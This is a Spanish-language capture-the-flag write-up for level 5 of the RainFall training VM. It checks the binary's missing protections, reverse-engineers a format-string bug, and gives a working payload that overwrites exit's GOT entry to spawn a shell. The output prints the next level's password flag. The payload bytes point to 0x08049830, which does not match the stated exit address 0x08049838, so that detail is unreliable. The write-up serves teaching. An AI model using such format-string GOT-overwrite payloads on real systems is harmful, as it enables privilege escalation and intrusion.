# 1. Buscar Binario:

Listamos los archivos para que nos muestre el binario del 'level4' y sus permisos. 

```bash
level5@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
-rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
-rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile
```

> **Nota:** El bit `s` en los permisos indica que es un binario **SUID**. Se ejecutará con los privilegios del propietario (`level6`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```bash
level5@RainFall:~$ file ./level5 
./level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xed1835fb7b09db7da4238a6fa717ad9fd835ae92, not stripped
```

### b). ASLR:
```bash
level5@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level5@RainFall:~$ readelf -l ./level5 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```bash
level5@RainFall:~$ nm ./level5 
-bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```bash
level5@RainFall:~$ readelf -S ./level5 | grep -E ".got|.plt"
  [10] .rel.plt          REL             080482fc 0002fc 000038 08   A  5  12  4
  [12] .plt              PROGBITS        08048370 000370 000080 04  AX  0   0 16
  [22] .got              PROGBITS        08049814 000814 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049818 000818 000028 04  WA  0   0  4

```

---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000` |
| **ASLR** | **OFF** | `0` | Las direcciones de librerías y stack son constantes. |
| **NX** | **OFF** | `GNU_STACK RWE` | Si podemos ejecutar código (ShellCode) en el Stack |
| **RELRO** | **OFF** | `No RELRO ` | La tabla GOT puede ser sobrescrita. |
| **CANARY** | **? ? ?**  | `error` | Buscar con `gdb` |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got` en escritura |

---

# 4. Fuzzing:

No podemos romper el binario por tamaño de entrada y usamos gdb para desensamblar el binario y poder encontrar la vulnerabilidad. El desbordamiento de buffer clásico es imposible aquí.
```
level5@RainFall:~$ (printf 'A%.0s' {1..600};) | ./level5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
level5@RainFall:~$
```

# 5. Reverse Engineering (Target Identification):

Análisis de la función `n`
```asm
0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>    ; Llama a la función 'fgets'
0x080484ea <+40>:	lea    eax,[ebp-0x208]          ; Calcula donde se encuetra el buffer leido
0x080484f0 <+46>:	mov    DWORD PTR [esp],eax      ; Copia el buffer leido al tope del stack
0x080484f3 <+49>:	call   0x8048380 <printf@plt>   ; Llama a 'printf(buffer)' y lo muetsra en pantalla
0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1      ; Copia 1 byte a lo alto del stack
0x080484ff <+61>:	call   0x80483d0 <exit@plt>     ; Llama a 'exit'
```

Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level5/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level5/source.c).

# 6. Solución: Sobreescribir en el *.got* 

- `main` solo alinea el stack y llama a la función `n`. La función `n` lee con `fgets()` y realiza la impresión.
- `fgets`limita la lectura, impidiendo que un *Buffer Overflow*.
- `printf` recibe buffer sin un string de formato fijo (`print(buffer)` en lugar de `printf("%s", buffer)`)
- **La .got:** Es una tabla donde el programa guarda las direcciones reales de las funciones de las librerías dinámicas: `printf`, `fgets`, `exit`, etc.
- Si cambiamos la direcciñón de `exit` en el registro `.got` por la dirección de alguna función que nos de la shell, cuando el programa ejecute `call exit@plt` en realidad saltará a donde queramos.

1. **Identificamos el BACKDOOR**

```asm
0x080484f0 <+46>:	mov    DWORD PTR [esp],eax        ⟸
0x080484f3 <+49>:	call   0x8048380 <printf@plt>       ; Printea lo que recibe.
```

2. **Identificando Objetivos:**

- Buscamos la dirección de `exit` en la `,got`.
- Buscamos hacia donde queremos saltar. La función que ejecute `system("/bin/sh")`
- Usamos el comando `objdump` para encontrar la dirección de `exit`:

```bash
level5@RainFall:~$ objdump -R ./level5 

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit                     ⟸    08049838     
0804983c R_386_JUMP_SLOT   __libc_start_main

```
- Volvemos a usar el comando `objdump` para encontrar la función a la que saltar. suele haber una función llamada `o` o similar que ejecuta `system("/bin/sh")`.

```bash
level5@RainFall:~$ objdump -d ./level5 | grep "<o>:" 
080484a4 <o>:                                        ⟸   080484a4
```

3. **Cálculo del Offset:**

```bash
level5@RainFall:~$ ./level5 
AAAA %p %p %p %p %p %p %p %p 
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
level5@RainFall:~$ 
```
- El valor hexadecimal de `AAAA` (`0x41414141`) aparece en la prosición **4**. El buffer comienza a ser leido por `printf` a partir del 4º argumento en el stack.

4. **Construcción del Payload:**

- **\x30\x98\x04\x08:** Escribimos la dirección de desitno `exit` en `.got` (4 bytes).
- **%%134513824d:** Forzamos a `printf` a imprimir una cantidad masiva de caracteres: Valor objetivo: `0x080484a4` → 134513828 (Decimal). Relleno (Padding): 134513828 − 4 = 134513824.
- **%%4\$n:** Le decimos a `printf`: "Este el total de los caracteres escritos hasta ahora e inyéctalo en la dirección apuntada por el 4º argumento del stack". 

### **Ejecución:**
```bash
level5@RainFall:~$ (printf "\x30\x98\x04\x08"; printf "%%134513824%%4\$n"; cat) | ./level5
whoami
level6
pwd
/home/user/level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
^C  
level5@RainFall:~$ su level6
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
level6@RainFall:~$ 
```

# **5. Conclusión:**

En el **Level 5**, aunque la vulnerabilidad sigue siendo un **Format String**, la manera de ataque cambia. Ya no buscamos modificar una variable lógica, sino redirigir el flujo de ejecución del programa mediante la **sobrescritura de la GOT (Global Offset Table)**. 

Como el programa termina con `exit`, el objetivo es sobrescribir la dirección de una función en la GOT (Global Offset Table) `.got`.

**Fliujo de lo que ocurre en la memoria**:
- n() termina.
- Llama a exit@plt.
- exit@plt salta a la dirección guardada en 0x08049838 (GOT).
- Como ahí hemos escrito 0x080484a4, el programa salta a la función o().

